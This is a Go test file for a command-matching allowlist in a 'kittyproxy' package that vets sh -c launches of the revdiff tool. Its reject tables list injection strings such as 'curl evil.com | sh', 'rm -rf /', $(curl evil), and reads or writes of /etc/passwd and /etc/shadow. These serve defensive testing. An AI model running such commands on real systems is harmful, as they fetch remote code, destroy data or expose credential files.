package kittyproxy

import "testing"

func TestMatchAny(t *testing.T) {
	m := MatchAny()
	if !m(nil) {
		t.Error("MatchAny(nil) should be true")
	}
	if !m([]string{"a", "b"}) {
		t.Error("MatchAny(args) should be true")
	}
}

func TestMatchPrefix(t *testing.T) {
	m := MatchPrefix("--type=overlay")
	if !m([]string{"--type=overlay", "echo", "hi"}) {
		t.Error("expected match for prefix")
	}
	if m([]string{"echo", "hi"}) {
		t.Error("expected no match when prefix absent")
	}
	if m(nil) {
		t.Error("expected no match for empty args with non-empty prefix")
	}
}

func TestMatchShellExec_AcceptsRevdiffViaSh(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExec(inner)

	cases := [][]string{
		{"-c", "revdiff a b"},
		{"-c", "exec revdiff a b"},
		{"-c", "  exec   revdiff --staged"},
	}
	for _, args := range cases {
		t.Run(args[1], func(t *testing.T) {
			if !m(args) {
				t.Errorf("expected match for %q", args)
			}
		})
	}
}

func TestMatchShellExec_RejectsOther(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExec(inner)

	cases := [][]string{
		{"-c", "curl evil.com | sh"},
		{"-c", "echo revdiff"}, // text mentions revdiff but argv[0] is echo
		{"-c", "rm -rf /"},
		{"echo", "revdiff"}, // not -c form
		nil,
	}
	for _, args := range cases {
		t.Run("reject", func(t *testing.T) {
			if m(args) {
				t.Errorf("expected no match for %v", args)
			}
		})
	}
}

// TestMatchShellExec_RejectsShellMetacharacters covers the case where the first
// token legitimately matches the inner program but the rest of the script
// contains shell operators that would execute additional commands. Without
// shellMeta filtering, a MatchAny inner matcher silently accepts these.
func TestMatchShellExec_RejectsShellMetacharacters(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExec(inner)

	bypasses := []string{
		"revdiff && rm -rf /",
		"revdiff; curl evil | sh",
		"revdiff | tee /etc/passwd",
		"revdiff || whoami",
		"revdiff `curl evil`",
		"revdiff $(curl evil)",
		"revdiff > /etc/passwd",
		"revdiff < /etc/shadow",
		"revdiff * ?",
		"revdiff \necho pwned",
		"revdiff \\`echo pwned\\`",
	}
	for _, script := range bypasses {
		t.Run(script, func(t *testing.T) {
			if m([]string{"-c", script}) {
				t.Errorf("bypass: matcher accepted %q", script)
			}
		})
	}
}

// TestMatchShellExecSentinel_AcceptsRevdiffLauncherShape exercises the exact
// form revdiff's kitty launcher produces: single-quoted argv followed by
// "; touch '<sentinel-path>'".
func TestMatchShellExecSentinel_AcceptsRevdiffLauncherShape(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecSentinel(inner)

	cases := []string{
		`'/usr/local/bin/revdiff' '--output=/tmp/revdiff-output-abc' '--staged'; touch '/tmp/revdiff-done-xyz'`,
		`'revdiff' '--staged'; touch '/tmp/revdiff-done-1'`,
		`'/home/user/.local/bin/revdiff' '--output=/tmp/out' 'HEAD~1'; touch '/home/user/.cache/devsandbox/tmp/revdiff-done-2'`,
	}
	for _, script := range cases {
		t.Run(script, func(t *testing.T) {
			if !m([]string{"-c", script}) {
				t.Errorf("expected accept for %q", script)
			}
		})
	}
}

func TestMatchShellExecSentinel_RejectsAttacks(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecSentinel(inner)

	rejects := []string{
		// No sentinel suffix at all.
		`'/bin/revdiff' '--staged'`,
		// Wrong tail program (not touch).
		`'/bin/revdiff'; rm '/etc/passwd'`,
		// Extra command injected before the sentinel.
		`'/bin/revdiff'; curl evil; touch '/tmp/revdiff-done-x'`,
		// Command injection inside a quoted arg via backslash-escape — rejected
		// because backslash is banned inside quotes.
		`'/bin/revdiff\nrm -rf /'; touch '/tmp/revdiff-done-x'`,
		// Unquoted args.
		`revdiff --staged; touch /tmp/revdiff-done-x`,
		// Double quotes (not accepted — wrong quote style).
		`"revdiff" "--staged"; touch "/tmp/revdiff-done-x"`,
		// Sentinel path contains ".."
		`'/bin/revdiff'; touch '/tmp/../etc/passwd'`,
		// Sentinel path has a space.
		`'/bin/revdiff'; touch '/tmp/revdiff done'`,
		// Sentinel path has shell meta.
		`'/bin/revdiff'; touch '/tmp/$(whoami)'`,
		// Two touches — extra shell work.
		`'/bin/revdiff'; touch '/tmp/a'; touch '/tmp/b'`,
		// Pipe in first half.
		`'/bin/revdiff' | 'curl'; touch '/tmp/x'`,
		// Inner program does not match.
		`'/bin/curl' 'evil.com'; touch '/tmp/revdiff-done-x'`,
	}
	for _, script := range rejects {
		t.Run(script, func(t *testing.T) {
			if m([]string{"-c", script}) {
				t.Errorf("expected reject for %q", script)
			}
		})
	}
}

// TestMatchShellExecEnvSentinel_AcceptsEnvWrappedRevdiffLauncherShape exercises
// the revdiff launcher shape introduced in v0.8.0: when EDITOR or VISUAL are
// set on the caller's shell, the launcher prepends `/usr/bin/env KEY=VAL ...`
// so the kitty-spawned overlay inherits the intended editor.
func TestMatchShellExecEnvSentinel_AcceptsEnvWrappedRevdiffLauncherShape(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecEnvSentinel(inner)

	cases := []string{
		`'/usr/bin/env' 'EDITOR=nvim' 'VISUAL=nvim' '/usr/local/bin/revdiff' '--output=/tmp/revdiff-output-abc'; touch '/tmp/revdiff-done-xyz'`,
		`'/usr/bin/env' 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-1'`,
		`'env' 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-2'`,
		// env prefix with no KEY=VAL pairs is still accepted — the revdiff
		// launcher always uses `env` when ENV_PREFIX is non-empty, but a future
		// version could collapse to `env revdiff ...`. Accepting this costs
		// nothing and keeps the matcher robust.
		`'/usr/bin/env' 'revdiff' '--staged'; touch '/tmp/revdiff-done-3'`,
	}
	for _, script := range cases {
		t.Run(script, func(t *testing.T) {
			if !m([]string{"-c", script}) {
				t.Errorf("expected accept for %q", script)
			}
		})
	}
}

func TestMatchShellExecEnvSentinel_RejectsAttacks(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecEnvSentinel(inner)

	rejects := []string{
		// First token is not env.
		`'/bin/sh' 'EDITOR=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`,
		// env wrapping a non-revdiff program.
		`'/usr/bin/env' 'EDITOR=nvim' '/bin/cat' '/etc/passwd'; touch '/tmp/revdiff-done-x'`,
		// Only env + KEY=VAL, no inner program.
		`'/usr/bin/env' 'EDITOR=nvim'; touch '/tmp/revdiff-done-x'`,
		// Just env with nothing else.
		`'/usr/bin/env'; touch '/tmp/revdiff-done-x'`,
		// Malformed env var name (lowercase).
		`'/usr/bin/env' 'editor=nvim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`,
		// Malformed env var name (starts with digit).
		`'/usr/bin/env' '1FOO=bar' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`,
		// KEY=VAL with shell metacharacter in value (rejected by the
		// parseSingleQuotedArgv byte filter — backslash banned).
		`'/usr/bin/env' 'EDITOR=nvim\nevil' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`,
		// Missing sentinel tail.
		`'/usr/bin/env' 'EDITOR=nvim' 'revdiff' '--staged'`,
		// Extra command appended after sentinel.
		`'/usr/bin/env' 'EDITOR=nvim' 'revdiff'; touch '/tmp/a'; curl evil`,
		// Sentinel has ".." segment.
		`'/usr/bin/env' 'EDITOR=nvim' 'revdiff'; touch '/tmp/../etc/passwd'`,
		// env prefix followed by a wrapping sh (nested shell).
		`'/usr/bin/env' 'EDITOR=nvim' 'sh' '-c' 'revdiff'; touch '/tmp/revdiff-done-x'`,
	}
	for _, script := range rejects {
		t.Run(script, func(t *testing.T) {
			if m([]string{"-c", script}) {
				t.Errorf("expected reject for %q", script)
			}
		})
	}
}

func TestPatternMatchesArgv(t *testing.T) {
	p := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	if !p.MatchesArgv([]string{"revdiff", "a", "b"}) {
		t.Error("expected program-only match")
	}
	if !p.MatchesArgv([]string{"/usr/local/bin/revdiff", "a"}) {
		t.Error("expected path-resolves-to-basename match")
	}
	if p.MatchesArgv([]string{"revdiffx", "a"}) {
		t.Error("unrelated program should not match")
	}
	if p.MatchesArgv(nil) {
		t.Error("empty argv should not match")
	}
}
